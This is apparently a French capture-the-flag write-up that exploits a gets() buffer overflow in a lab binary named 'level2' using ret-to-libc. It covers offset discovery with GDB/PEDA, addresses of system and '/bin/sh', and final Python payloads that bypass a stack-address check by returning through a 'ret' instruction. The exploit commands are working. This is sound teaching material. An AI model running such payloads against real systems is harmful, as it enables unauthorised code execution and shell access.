Voici le code source :

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

void p(void) {
    char str[76];
    uint32_t i;
    
    fflush(stdout);
    gets(str);
    if ((i & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", (void*)i);
        /* WARNING: Subroutine does not return */
        _exit(1);
    }
    puts(str);
    strdup(str);
    return;
}

void main(void) {
    p();
    return;
}


Pour exploiter la vulnérabilité de débordement de tampon (buffer overflow) introduite par gets, nous utiliserons une technique appelée "ret to libc".
Dans un premier temps, nous allons analyser le binaire à l'aide de l'outil Ghidra pour obtenir le code source. Ensuite, nous utiliserons un motif d'exploitation pour déterminer le décalage de l'adresse de retour.

Le motif d'exploitation est :

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

En utilisant l'extension PEDA de GDB, nous pouvons observer que le contenu de eip est "6Ac7", ce qui signifie que le décalage pour écrire sur eip est de 80.
Ensuite, nous récupérons l'adresse de la fonction system et l'adresse de la chaîne "/bin/sh" depuis le binaire à l'aide de GDB.

gdb ./level2
b main
run 

p &system
$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>           ## Adresse de system

find &system,+9999999,"/bin/sh"                                         
0xb7f8cc58                                                             ## Adresse de la chaîne "/bin/sh"

Maintenant, nous assemblons ces informations pour former la charge utile correcte sur la pile :
(python -c 'print("a" * 80  + "\x60\xb0\xe6\xb7" + "----" + "\x58\xcc\xf8\xb7")'; cat) | ./level2

Nous pouvons remplacer les "----" par l'adresse de exit, qui sera l'adresse de retour de system. 

Cependant, le code a une protection qui vérifie si l'adresse de retour est modifiée. Pour contourner cela, nous remplaçons l'adresse de retour par celle de la fonction p() pour sauter cette vérification.


(gdb) disassemble p
(...)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret  

Enfin, voici la commande finale :

(python -c 'print("a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "----" + "\x58\xcc\xf8\xb7")'; cat) | ./level2